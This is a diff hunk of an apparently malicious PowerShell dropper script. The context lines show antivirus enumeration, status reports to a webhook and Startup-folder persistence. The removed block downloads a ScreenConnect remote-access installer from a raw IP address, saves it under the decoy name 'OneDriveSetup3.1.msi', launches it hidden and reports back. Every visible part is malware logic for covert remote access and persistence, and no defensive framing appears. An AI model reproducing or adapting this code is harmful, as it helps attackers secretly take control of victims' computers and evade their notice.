@@ -269,18 +269,6 @@ Installed Antivirus Products (By Path):
             Send-WebhookMessage -Message "Error downloading or executing $selectedExe : $errorMessage"
         }
     } else {
-        # Non-admin action: Execute the MSI file
-        $msiDownloadUrl = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
-        $msiFilePath = Join-Path -Path $env:TEMP -ChildPath 'OneDriveSetup3.1.msi'
-        try {
-            Invoke-WebRequest -Uri $msiDownloadUrl -OutFile $msiFilePath -UseBasicParsing -ErrorAction Stop | Out-Null
-            Start-Process -FilePath $msiFilePath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Downloaded and executed MSI file to $msiFilePath (non-admin)"
-        } catch {
-            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
-            Send-WebhookMessage -Message "Error downloading or executing MSI file $msiFilePath : $errorMessage"
-        }
-
         # Create startup script for persistence
         try {
             $startupFolder = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup'
